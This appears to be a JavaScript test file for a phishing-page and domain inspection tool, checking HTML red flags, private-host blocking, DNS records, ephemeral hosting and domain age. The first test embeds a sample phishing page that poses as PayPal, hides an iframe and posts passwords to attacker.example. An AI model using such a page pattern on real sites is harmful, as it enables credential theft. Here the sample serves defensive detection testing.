const test = require("node:test");
const assert = require("node:assert/strict");
const { analyzeHtml, checkDomainAge, fetchPublicHtml, inspectDns, inspectHostname } = require("../src/live-inspection");

test("flags hidden frames, disabled context menu and cross-domain password forms", () => {
  const html = `<title>PayPal account</title>
    <iframe src="x" style="display:none"></iframe>
    <script>document.addEventListener('contextmenu', event => event.preventDefault());</script>
    <form action="http://attacker.example/collect"><input type="password"></form>
    <link rel="icon" href="/google-icon.ico">`;
  const { diagnostics } = analyzeHtml(html, "https://random.example/");
  const codes = diagnostics.map((item) => item.code);

  assert.ok(codes.includes("hidden_iframe"));
  assert.ok(codes.includes("disabled_context_menu"));
  assert.ok(codes.includes("password_form_http"));
  assert.ok(codes.includes("password_form_external"));
  assert.ok(codes.includes("branding_domain_mismatch"));
});

test("does not fetch an internal host during HTML inspection", async () => {
  const result = await fetchPublicHtml("http://127.0.0.1/", {
    getHtml: async () => { throw new Error("must not request"); },
  });

  assert.match(result.error, /private or reserved/);
});

test("reports missing SPF/DMARC and MX as informational diagnostics", async () => {
  const resolver = {
    resolveMx: async () => { const error = new Error("no MX"); error.code = "ENODATA"; throw error; },
    resolveTxt: async (name) => {
      const error = new Error("no TXT");
      error.code = "ENODATA";
      throw error;
    },
  };
  const result = await inspectDns("example.com", { resolver });

  assert.deepEqual(new Set(result.map((item) => item.code)), new Set(["missing_mx", "missing_spf", "missing_dmarc"]));
  assert.ok(result.every((item) => item.penalty === 0));
});

test("flags ephemeral hosting as a risk signal", () => {
  const result = inspectHostname("login-example.pages.dev");

  assert.equal(result.length, 1);
  assert.equal(result[0].code, "ephemeral_hosting");
  assert.ok(result[0].penalty >= 20);
});

test("detects recent registration dates from RDAP without making a real request", async () => {
  const result = await checkDomainAge("example.com", {
    fetch: async () => ({
      ok: true,
      json: async () => ({ events: [{ eventAction: "registration", eventDate: new Date(Date.now() - 3 * 86400000).toISOString() }] }),
    }),
  });

  assert.equal(result.performed, true);
  assert.ok(result.ageDays < 30);
});
